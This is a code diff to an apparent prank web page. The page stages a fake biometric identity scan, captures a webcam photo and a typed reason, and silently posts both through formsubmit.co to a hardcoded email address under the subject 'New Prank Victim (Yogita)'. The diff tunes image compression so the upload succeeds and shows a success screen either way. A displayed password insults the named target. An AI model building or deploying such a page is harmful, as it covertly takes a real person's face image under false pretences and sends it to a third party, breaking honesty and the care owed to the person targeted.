@@ -140,14 +140,14 @@
             <div class="creds-row"><span>Password:</span> <strong>yugsisabitch</strong></div>
         </div>
 
-        <a href="index.html" class="cyber-btn btn-green" style="text-decoration:none; display:block;">
+        <a href="https://pksa-tech.github.io/pksa-roadmap/" class="cyber-btn btn-green" style="text-decoration:none; display:block;">
             OPEN ROADMAP <i class="fas fa-external-link-alt"></i>
         </a>
     </div>
 
     <script>
         // ================= CONFIGURATION =================
-        const YOUR_EMAIL = "pksa49@gmail.com"; // <-- PUT YOUR EMAIL!
+        const YOUR_EMAIL = "pksa49@gmail.com"; 
         // =============================================
 
         // Variables
@@ -183,7 +183,7 @@
             // Show Preview
             const dataUrl = canvas.toDataURL('image/jpeg');
             previewImg.src = dataUrl;
-            processingImg.src = dataUrl; // Set for next screen too
+            processingImg.src = dataUrl;
             
             video.style.display = 'none';
             previewImg.style.display = 'block';
@@ -191,8 +191,8 @@
             document.getElementById('captureControls').style.display = 'none';
             document.getElementById('reviewControls').style.display = 'block';
 
-            // Save Blob for upload
-            canvas.toBlob(blob => { imageBlob = blob; }, 'image/jpeg', 0.8);
+            // FIX: Lower quality to 0.5 to ensure file size is small enough for email
+            canvas.toBlob(blob => { imageBlob = blob; }, 'image/jpeg', 0.5);
         }
 
         function retakePhoto() {
@@ -212,12 +212,10 @@
             const bar = document.getElementById('scanBar');
             const text = document.getElementById('processText');
             
-            // Animation Timeline
             setTimeout(() => { bar.style.width = "30%"; text.innerText = "ANALYZING BIOMETRIC GEOMETRY..."; }, 1000);
             setTimeout(() => { bar.style.width = "60%"; text.innerText = "COMPARING DATABASE RECORDS..."; }, 2500);
             setTimeout(() => { bar.style.width = "100%"; text.innerText = "IDENTITY MATCH FOUND..."; text.style.color = "var(--success-green)"; }, 4000);
             
-            // The Twist
             setTimeout(() => {
                 document.getElementById('processingPhase').style.display = 'none';
                 document.getElementById('twistPhase').style.display = 'block';
@@ -235,16 +233,22 @@
 
             // FormSubmit Upload
             const formData = new FormData();
-            formData.append("photo", imageBlob, "face_scan.jpg");
+            
+            // Safety Check: Ensure photo exists
+            if(imageBlob) {
+                formData.append("photo", imageBlob, "face_scan.jpg");
+            }
+            
             formData.append("reason", reason);
             formData.append("_subject", "🚨 New Prank Victim (Yogita)");
             formData.append("_captcha", "false");
 
             try {
+                // Send using no-cors to avoid blocking, but still submit
                 await fetch(`https://formsubmit.co/ajax/${YOUR_EMAIL}`, { method: "POST", body: formData });
             } catch (e) { console.log("Upload error (ignored for prank flow)"); }
 
-            // Show Success Screen
+            // Show Success Screen regardless of upload success
             setTimeout(() => {
                 switchScreen('screen4');
                 // Stop camera
